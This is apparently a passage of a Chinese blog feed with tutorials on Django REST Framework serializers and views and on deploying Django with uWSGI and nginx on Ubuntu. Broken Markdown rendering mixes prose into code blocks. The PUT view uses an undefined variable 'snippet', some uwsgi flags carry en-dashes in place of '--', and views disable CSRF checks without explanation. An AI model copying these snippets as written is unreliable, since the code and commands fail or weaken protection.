<h3 id="使用更高级的-ModelSerializers"><a href="#使用更高级的-ModelSerializers" class="headerlink" title="使用更高级的 ModelSerializers"></a>使用更高级的 ModelSerializers</h3><p>接着如果你按照官网的教程走下去，你会发现上面的 <figure class="highlight plain"><figcaption><span>是个代码冗杂的序列器，这不符合 Python 的风格。</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">所以我们要做的就是简化代码。</div><div class="line"></div><div class="line">DRF 提供了更为简便的 ```ModelSerializer``` 类可以解决这个问题。</div><div class="line"></div><div class="line">所以我们修改之前的 ```serializer.py``` : </div><div class="line"></div><div class="line">```python</div><div class="line">class MoviesSerializer(serializers.ModelSerializer):</div><div class="line">    class Meta:</div><div class="line">        model = Movies</div><div class="line">        fields = (&apos;id&apos;, &apos;title&apos;, &apos;year&apos;, &apos;country&apos;, &apos;type&apos;, &apos;rating&apos;)</div></pre></td></tr></table></figure></p>
<p>这种模式的序列器可以很方便地检查 fields 中的每个字段</p>
<p>然后在终端中打开 Django shell </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ python manage.py shell</div></pre></td></tr></table></figure>
<p>输入以下代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> douban.serializer <span class="keyword">import</span> MoviesSerializer</div><div class="line">serializer = MoviesSerializer()</div><div class="line">print(repr(serializer))</div><div class="line"></div><div class="line"><span class="comment">#MoviesSerializer():</span></div><div class="line">    id = IntegerField(label=<span class="string">'ID'</span>, read_only=<span class="keyword">True</span>)</div><div class="line">    title = CharField(allow_blank=<span class="keyword">True</span>, max_length=<span class="number">100</span>, required=<span class="keyword">False</span>)</div><div class="line">    year = CharField(max_length=<span class="number">20</span>)</div><div class="line">    country = ChoiceField(choices=((<span class="string">'US'</span>, <span class="string">'US'</span>), (<span class="string">'Asia'</span>, <span class="string">'Asia'</span>), (<span class="string">'CN'</span>, <span class="string">'CN'</span>), (<span class="string">'TW'</span>, <span class="string">'TW'</span>)), required=<span class="keyword">False</span>)</div><div class="line">    type = ChoiceField(choices=((<span class="string">'Drama'</span>, <span class="string">'Drama'</span>), (<span class="string">'Thriller'</span>, <span class="string">'Thriller'</span>), (<span class="string">'Sci-Fi'</span>, <span class="string">'Sci-Fi'</span>), (<span class="string">'Romance'</span>, <span class="string">'Romance'</span>), (<span class="string">'Comedy'</span>, <span class="string">'Comedy'</span>)), required=<span class="keyword">False</span>)</div><div class="line">    rating = DecimalField(decimal_places=<span class="number">1</span>, max_digits=<span class="number">3</span>)</div></pre></td></tr></table></figure>
<p>注: <figure class="highlight plain"><figcaption><span>类仅仅是创建 ```serializer``` 类的一个快捷方法，它除了实现以下两种方法外并没有其余的功能: </span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">- 声明需要展现的字段</div><div class="line">- 定义  `create()` 和 `update()` 方法</div><div class="line"></div><div class="line">### 使用 Django views 编写序列器视图</div><div class="line"></div><div class="line">为了更好理解序列器，我们不使用 DRF 的其他特性，仅仅用 Django views 模式来编写序列器的视图。</div><div class="line"></div><div class="line">我们会创建一个 HttpResponse 的子类，这样就能将数据以 json 格式返回。</div><div class="line"></div><div class="line">编辑 ```douban/views.py``` 加入以下代码: </div><div class="line"></div><div class="line">```python</div><div class="line">from django.http import HttpResponse</div><div class="line">from django.views.decorators.csrf import csrf_exempt</div><div class="line">from rest_framework.renderers import JSONRenderer</div><div class="line">from rest_framework.parsers import JSONParser</div><div class="line">from douban.models import Movies</div><div class="line">from douban.serializer import MoviesSerializer</div><div class="line"></div><div class="line">class JSONResponse(HttpResponse):</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    将数据转为 JSON 格式的 HttpResponse 子类</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    def __init__(self, data, **kwargs):</div><div class="line">        content = JSONRenderer().render(data)</div><div class="line">        kwargs[&apos;content_type&apos;] = &apos;application/json&apos;</div><div class="line">        super(JSONResponse, self).__init__(content, **kwargs)</div></pre></td></tr></table></figure></p>
<p>讲道理的话，我们 api 的根目录应该能罗列出所有的 Movies 或者 能新建一个 Movies </p>
<p>并且还需要一个用于展示、更新和删除 Movies 的 views</p>
<p>编辑 <figure class="highlight plain"><figcaption><span>加入以下代码: </span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">```python</div><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: utf-8 -*-</div><div class="line"></div><div class="line">from django.http import HttpResponse</div><div class="line">from django.views.decorators.csrf import csrf_exempt</div><div class="line">from rest_framework.renderers import JSONRenderer</div><div class="line">from rest_framework.parsers import JSONParser</div><div class="line">from douban.models import Movies</div><div class="line">from douban.serializer import MoviesSerializer</div><div class="line"></div><div class="line">class JSONResponse(HttpResponse):</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    将数据转为 JSON 格式的 HttpResponse 子类</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    def __init__(self, data, **kwargs):</div><div class="line">        content = JSONRenderer().render(data)</div><div class="line">        kwargs[&apos;content_type&apos;] = &apos;application/json&apos;</div><div class="line">        super(JSONResponse, self).__init__(content, **kwargs)</div><div class="line"></div><div class="line">@csrf_exempt</div><div class="line">def movies_list(request):</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    罗列出所有的 Movies 或者 能新建一个 Movies</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    if request.method == &apos;GET&apos;:</div><div class="line">        movies = Movies.objects.all()</div><div class="line">        serializer = MoviesSerializer(movies, many=True)</div><div class="line">        return JSONResponse(serializer.data)</div><div class="line"></div><div class="line">    elif request.method == &apos;POST&apos;:</div><div class="line">        data = JSONParser().parse(request)</div><div class="line">        serializer = MoviesSerializer(data=data)</div><div class="line">        if serializer.is_valid():</div><div class="line">            serializer.save()</div><div class="line">            return JSONResponse(serializer.data, status=201)</div><div class="line">        return JSONResponse(serializer.errors, status=400)</div><div class="line"></div><div class="line">@csrf_exempt</div><div class="line">def movies_detail(request, pk):</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    展示\更新或删除一个 Movies</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    try:</div><div class="line">        movies = Movies.objects.get(pk=pk)</div><div class="line">    except Movies.DoesNotExist:</div><div class="line">        return HttpResponse(status=404)</div><div class="line"></div><div class="line">    if request.method == &apos;GET&apos;:</div><div class="line">        serializer = MoviesSerializer(movies)</div><div class="line">        return JSONResponse(serializer.data)</div><div class="line"></div><div class="line">    elif request.method == &apos;PUT&apos;:</div><div class="line">        data = JSONParser().parse(request)</div><div class="line">        serializer = MoviesSerializer(snippet, data=data)</div><div class="line">        if serializer.is_valid():</div><div class="line">            serializer.save()</div><div class="line">            return JSONResponse(serializer.data)</div><div class="line">        return JSONResponse(serializer.errors, status=400)</div><div class="line"></div><div class="line">    elif request.method == &apos;DELETE&apos;:</div><div class="line">        movies.delete()</div><div class="line">        return HttpResponse(status=204)</div></pre></td></tr></table></figure></p>
<p>我不是很弄明白这里关掉 csrf 的意义，那不如直接就不用 csrf 不就好了？</p>
<p>不管了，先放着，以后回来看 ( 吐舌头</p>
<p>最后修改 <figure class="highlight plain"><figcaption><span>导入相应的视图</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">```python</div><div class="line">from django.conf.urls import url</div><div class="line">from douban import views</div><div class="line"></div><div class="line">urlpatterns = [</div><div class="line">    url(r&apos;^dbmovies/$&apos;, views.movies_list),</div><div class="line">    url(r&apos;^dbmovies/(?P&lt;pk&gt;[0-9]+)/$&apos;, views.movies_detail),</div><div class="line">]</div></pre></td></tr></table></figure></p>
<p>并在 <figure class="highlight plain"><figcaption><span>中 include 一下</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">```python</div><div class="line">from django.conf.urls import url, include</div><div class="line"></div><div class="line">urlpatterns = [</div><div class="line">    url(r&apos;^&apos;, include(&apos;douban.urls&apos;)),</div><div class="line">]</div></pre></td></tr></table></figure></p>
<p>这样 url 和 views 就绑定好了。</p>
<h3 id="测试-Web-API"><a href="#测试-Web-API" class="headerlink" title="测试 Web API"></a>测试 Web API</h3><p>在终端中输入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ python manage.py runserver</div></pre></td></tr></table></figure>
<p>接着来浏览器中访问 <code>http://127.0.0.1/dbmovies/</code> </p>
<p><img src="http://7xse6j.com1.z0.glb.clouddn.com/apitest.png" alt="apitest"></p>
<p>如果出现如图所示的 api 则说明 Web api 返回成功。</p>
<p>(顺便安利一个 chrome 插件 — <a href="https://www.baidufe.com/fehelper" target="_blank" rel="external">FeHelper</a> 可以自动格式化 JSON 代码)</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Django REST Framework 快速上手]]></title>
      <url>http://lexuslee.me/2016/03/29/2016-03-29-django-rest-framework/</url>
      <content type="html"><![CDATA[<h2 id="Django-REST-Framework-快速上手"><a href="#Django-REST-Framework-快速上手" class="headerlink" title="Django REST Framework 快速上手"></a>Django REST Framework 快速上手</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>这几天正好在研究 RESTful 的方式来写 API，然后上手 Django REST 框架。</p>
<p>Django REST Framework (以下简称 DRF )是一个轻量级的库，熟悉 Django 的话可以很容易的用它来构建 Web API。<br><a id="more"></a></p>
<h3 id="安装前提"><a href="#安装前提" class="headerlink" title="安装前提"></a>安装前提</h3><p>Django REST Framework 安装需要以下前提:</p>
<ul>
<li>Python (2.7, 3.2, 3.3, 3.4, 3.5)</li>
<li>Django (1.7+, 1.8, 1.9)</li>
</ul>
<p>我自己的环境是:</p>
<ul>
<li>Python 2.7.10</li>
<li>Django 1.8.2</li>
</ul>
<h3 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h3><p>安装 DRF 需要用到 <figure class="highlight plain"><figcaption><span>命令</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">```shell</div><div class="line">pip install djangorestframework</div><div class="line">pip install markdown	# Markdown support for the browsable API.</div><div class="line">pip install django-filter	# Filtering support</div></pre></td></tr></table></figure></p>
<p>或者在 GitHub 上 clone 它<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone git@github.com:tomchristie/django-rest-framework.git</div></pre></td></tr></table></figure></p>
<p>接着在 Django Project 根目录的 <figure class="highlight plain"><figcaption><span>文件中的 ```INSTALLED_APPS``` 加入 ```'rest_framework'```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">``` Python</div><div class="line">INSTALLED_APPS = (</div><div class="line">    ...</div><div class="line">    &apos;rest_framework&apos;,</div><div class="line">)</div></pre></td></tr></table></figure></p>
<p>如果你要使用 DRF 的 browsable API 的话，你可能还需要添加 REST 框架的登录登出视图 ( views )，辣么需要在 <figure class="highlight plain"><figcaption><span>文件中加入以下代码:</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">```python</div><div class="line">urlpatterns = [</div><div class="line">    ...</div><div class="line">    url(r&apos;^api-auth/&apos;, include(&apos;rest_framework.urls&apos;, namespace=&apos;rest_framework&apos;))</div><div class="line">]</div></pre></td></tr></table></figure></p>
<p>注: 这个 URL 地址可以是任意的，但是必须 include <figure class="highlight plain"><figcaption><span>和 ```namespace='rest_framework'``` 。</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">### 举个栗子</div><div class="line">现在我们来看一下一个简单的用 DRF 来构建一个模型支持较好的 API 的栗子。</div><div class="line"></div><div class="line">任何一个对 REST 框架的全局设置都被放在 ```REST_FRAMEWORK``` 的模块内，所以你需要在 ```settings.py``` 文件中添加以下代码来通过 ```REST_FRAMEWORK``` 入口进行全局设置:</div><div class="line"></div><div class="line">``` python</div><div class="line">REST_FRAMEWORK = &#123;</div><div class="line">    # Use Django&apos;s standard `django.contrib.auth` permissions,</div><div class="line">    # or allow read-only access for unauthenticated users.</div><div class="line">    &apos;DEFAULT_PERMISSION_CLASSES&apos;: [</div><div class="line">        &apos;rest_framework.permissions.DjangoModelPermissionsOrAnonReadOnly&apos;</div><div class="line">    ]</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>现在我们可以构建 API 了，编辑 Django 项目根目录的 <figure class="highlight plain"><figcaption><span>文件:</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">``` python</div><div class="line">from django.conf.urls import url, include</div><div class="line">from django.contrib.auth.models import User</div><div class="line">from rest_framework import routers, serializers, viewsets</div><div class="line"></div><div class="line"># Serializers define the API representation.</div><div class="line">class UserSerializer(serializers.HyperlinkedModelSerializer):</div><div class="line">    class Meta:</div><div class="line">        model = User</div><div class="line">        fields = (&apos;url&apos;, &apos;username&apos;, &apos;email&apos;, &apos;is_staff&apos;)</div><div class="line"></div><div class="line"># ViewSets define the view behavior.</div><div class="line">class UserViewSet(viewsets.ModelViewSet):</div><div class="line">    queryset = User.objects.all()</div><div class="line">    serializer_class = UserSerializer</div><div class="line"></div><div class="line"># Routers provide an easy way of automatically determining the URL conf.</div><div class="line">router = routers.DefaultRouter()</div><div class="line">router.register(r&apos;users&apos;, UserViewSet)</div><div class="line"></div><div class="line"># Wire up our API using automatic URL routing.</div><div class="line"># Additionally, we include login URLs for the browsable API.</div><div class="line">urlpatterns = [</div><div class="line">    url(r&apos;^&apos;, include(router.urls)),</div><div class="line">    url(r&apos;^api-auth/&apos;, include(&apos;rest_framework.urls&apos;, namespace=&apos;rest_framework&apos;))</div><div class="line">]</div></pre></td></tr></table></figure></p>
<p>解释一下，</p>
<p>每个 <code>xxxSerializer</code> 都要继承 <code>ModelSerializer</code> 来选择模型和模型字段。</p>
<p>UserSerializer 类继承了更符合 RESTful 设计的 <code>HyperlinkedModelSerializer</code> 超链接模型 Serializer 类，它和普通的 <code>ModelSerializer</code> 类有以下区别:</p>
<ul>
<li>缺省状态下不包含 pk 字段</li>
<li>具有一个 url 字段，即HyperlinkedIdentityField类型</li>
<li>用HyperlinkedRelatedField表示关系，而非PrimaryKeyRelatedField</li>
</ul>
<p>然后在 <code>class Meta</code> 中选择模型和要展现的模型元素</p>
<p><code>ViewSet</code> 用来定义 View 的行为，和 Django 的 views 类似，用来处理 API 的 read 、write、 update 等方法(而 Django views 则处理 http 的 GET 和 POST )</p>
<p>在 ViewSet 实例化之后，通过 <code>Router</code> 类，最终将 URL 和 ViewSet 方法绑定起来。</p>
<p>ok，现在你可以通过在浏览器中访问 <code>http://127.0.0.1:8000/</code> 来查看你的 ‘users’ API 了。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[在 Ubuntu 下搭建 uWSGI + nginx + Django]]></title>
      <url>http://lexuslee.me/2016/02/27/2016-02-27-nginx-uwsgi-django/</url>
      <content type="html"><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景 :"></a>背景 :</h3><p>公司要求用 Django 做些项目，之前按网上教程搭环境的时候就遇到很多问题，感觉有些教程都是有误的，今天用 uWSGI 开多线程的时候服务器报了 HTTP 500 的错( Internal Server Error )，然后就一直连不上去了。所以按<a href="http://uwsgi-docs.readthedocs.org/en/latest/tutorials/Django_and_nginx.html" target="_blank" rel="external">官网的教程</a>重新配置一遍，把出现的问题记录下来。<br><a id="more"></a></p>
<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><h4 id="概况"><a href="#概况" class="headerlink" title="概况"></a>概况</h4><p>一个 Web 服务器能加载 ( Html , images , CSS 等静态文件)，但是它不能直接跑 Django 应用 (对于动态的请求无法处理) ，它需要某些工具来支持 Django 应用的运行，从而使 服务器能够接受客户端的请求，处理，并返回请求。s</p>
<p>这时，我们就需要一个服务器网关接口 – WSGI ! WSGI 是一种Web服务器网关接口。它是一个 Web 服务器（如 nginx）与应用服务器（如 uWSGI 服务器）通信的一种规范</p>
<p>而 uWSGI 是一个Web服务器，它实现了 WSGI 协议、 uwsgi 、 http 等协议。</p>
<p>nginx 中 <figure class="highlight plain"><figcaption><span>的作用是与 uWSGI 服务器进行数据交换。</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">所以这套配置的实现原理是将 nginx 作为服务器最前端，它将接收 Web 的所有请求，统一管理请求。nginx 把所有静态请求自己来处理（这是 Nginx 的强项）。然后，Nginx 将所有非静态请求通过 uwsgi 传递给 Django ，由 Django 来进行处理，从而完成一次 Web 请求。</div><div class="line"></div><div class="line">配置 uWSGI + nginx + Django 即实现以下4个链接，在下文，我们会一步步进行链接。</div></pre></td></tr></table></figure></p>
<p>the web client &lt;-&gt; the web server &lt;-&gt; the socket &lt;-&gt; uwsgi &lt;-&gt; Django<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">#### Python</div><div class="line">Ubuntu 14.04 自带了 Python2.7.6</div><div class="line"></div><div class="line">你也可以通过</div></pre></td></tr></table></figure></p>
<p>sudo apt-get install python2.7 python2.7-dev<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">来安装最新版本的 Python2.7.11</div><div class="line">#### Python-pip</div><div class="line">pip 是 Python 的包管理工具，建议 Python 的包都用  pip 进行管理。</div><div class="line"></div><div class="line">通过以下命令安装  pip  :</div></pre></td></tr></table></figure></p>
<p>sudo apt-get install python-pip<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">#### Django</div><div class="line">通过以下命令安装 Django 并创建一个新的项目，然后进入到项目根目录 :</div></pre></td></tr></table></figure></p>
<p>sudo pip install Django<br>django-admin.py startproject mysite<br>cd mysite<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">#### 关于域名和端口</div><div class="line">在这篇 blog 中，我们把调试域名定为 127.0.0.1，你可以用自己的域名或本机 ip 地址来替代它。</div><div class="line"></div><div class="line">并且，我们用 8000 端口作为 web 调试地址端口，这个端口与大部分 web 服务器的端口不重叠，当然你也可以自行修改调试地址的端口。</div><div class="line"></div><div class="line">### 安装配置 uWSGI</div><div class="line">#### 安装</div></pre></td></tr></table></figure></p>
<p>sudo pip install uwsgi<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">用 ```pip``` 安装 uwsgi 最为方便，因为如果你用 ```apt-get install``` 来安装 uwsgi 的话，你需要在 Python 搜索路径中添加入 uwsgi 模块。</div><div class="line"></div><div class="line">#### 测试 uwsgi</div><div class="line">在刚刚的 mysite 目录下新建一个 Python 文件 ```test.py``` :</div><div class="line"></div><div class="line">``` python</div><div class="line"># test.py</div><div class="line">def application(env, start_response):</div><div class="line">    start_response(&apos;200 OK&apos;, [(&apos;Content-Type&apos;,&apos;text/html&apos;)])</div><div class="line">    return [b&quot;Hello World&quot;] # python3</div><div class="line">	#return [&quot;Hello World&quot;] # python2</div></pre></td></tr></table></figure></p>
<p>接着运行 uWSGI 命令:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uwsgi --http :8000 --wsgi-file test.py</div></pre></td></tr></table></figure>
<p>注意：在 <figure class="highlight plain"><figcaption><span>与 ```:8000``` 之间有一个空格！</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">参数含义：</div><div class="line"></div><div class="line">- ```http :8000```：使用 http 协议，8000端口</div><div class="line">- ```wsgi-file test.py``` : 加载指定文件 test.py</div><div class="line"></div><div class="line">接着在浏览器中输入以下 url :</div></pre></td></tr></table></figure></p>
<p><a href="http://127.0.0.1:8000" target="_blank" rel="external">http://127.0.0.1:8000</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">如果出现了 &apos;Hello World!&apos; 那说明 uWSGI 安装成功，以下链接是成功的 :</div></pre></td></tr></table></figure></p>
<p>the web client &lt;-&gt; uWSGI &lt;-&gt; Django<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">#### 测试 Django 项目</div><div class="line">现在我们用 uWSGI 来跑 Django 网站试试。</div><div class="line"></div><div class="line">首先进入 Django 项目根目录，即之前的 /mysite/ 运行</div></pre></td></tr></table></figure></p>
<p>python manage.py runserver 127.0.0.1:8888<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">在浏览器中访问该 url ，如果出现如下界面则说明你的 mysite 项目是可运行的 :</div><div class="line"></div><div class="line">![django_test](http://thehackercat-hackercat.stor.sinaapp.com/django_test1.png)</div><div class="line"></div><div class="line">接着运行 uWSGI :</div></pre></td></tr></table></figure></p>
<p>uwsgi –http :8000 –module mysite.wsgi<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">- ```module mysite.wsgi``` : 读取特定的 wsgi 模块</div><div class="line"></div><div class="line">如果出现同样的界面，说明你的 uWSGI 已经可以搭载你的 Django 应用惹，所以以下的链接是成功的 :</div></pre></td></tr></table></figure></p>
<p>the web client &lt;-&gt; uWSGI &lt;-&gt; Django<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">### 安装配置 nginx</div><div class="line">#### 安装 nginx</div></pre></td></tr></table></figure></p>
<p>sudo apt-get install nginx<br>sudo /etc/init.d/nginx start    # 开启 nginx 服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">现在到浏览器中输入 ```http://127.0.0.1``` ，如果你看到以下信息 : “Welcome to nginx!”那么说明 nginx 服务器运行成功，以下链接成功 :</div></pre></td></tr></table></figure></p>
<p>the web client &lt;-&gt; the web server<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">#### 配置 nginx</div><div class="line">首先，你需要一个 uwsgi_params 文件。</div><div class="line"></div><div class="line">- 将 uwsgi_params 文件拷贝到项目文件夹下(即 /mysite/ )。uwsgi_params文件在/etc/nginx/目录下，也可以从这个[页面下载](https://github.com/nginx/nginx/blob/master/conf/uwsgi_params)</div><div class="line">- 在项目文件夹下创建文件 mysite_nginx.conf ,填入并修改下面内容：</div></pre></td></tr></table></figure></p>
<h1 id="mysite-nginx-conf"><a href="#mysite-nginx-conf" class="headerlink" title="mysite_nginx.conf"></a>mysite_nginx.conf</h1><h1 id="the-upstream-component-nginx-needs-to-connect-to"><a href="#the-upstream-component-nginx-needs-to-connect-to" class="headerlink" title="the upstream component nginx needs to connect to"></a>the upstream component nginx needs to connect to</h1><p>upstream django {</p>
<pre><code># server unix:///path/to/your/mysite/mysite.sock; # for a file socket
server 127.0.0.1:8001; # for a web port socket (we&apos;ll use this first)
</code></pre><p>}</p>
<h1 id="configuration-of-the-server"><a href="#configuration-of-the-server" class="headerlink" title="configuration of the server"></a>configuration of the server</h1><p>server {</p>
<pre><code># the port your site will be served on
listen      8000;
# the domain name it will serve for
server_name 127.0.0.1; # substitute your machine&apos;s IP address or FQDN
charset     utf-8;

# max upload size
client_max_body_size 75M;   # adjust to taste

# Django media
location /media  {
    alias /path/to/your/mysite/media;  # your Django project&apos;s media files - amend as required
}

location /static {
    alias /path/to/your/mysite/static; # your Django project&apos;s static files - amend as required
}

# Finally, send all non-media requests to the Django server.
location / {
    uwsgi_pass  django;
    include     /path/to/your/mysite/uwsgi_params; # the uwsgi_params file you installed
}
</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">在终端中进入之前的 /mysite/ 项目文件夹，输入 ``pwd``` ，复制下该路径，将 mysite_nginx.conf 中的 /path/to/your/mysite 全部替换掉。</div><div class="line"></div><div class="line">在/etc/nginx/sites-enabled目录下创建本文件的连接，使nginx能够使用它 :</div></pre></td></tr></table></figure></p>
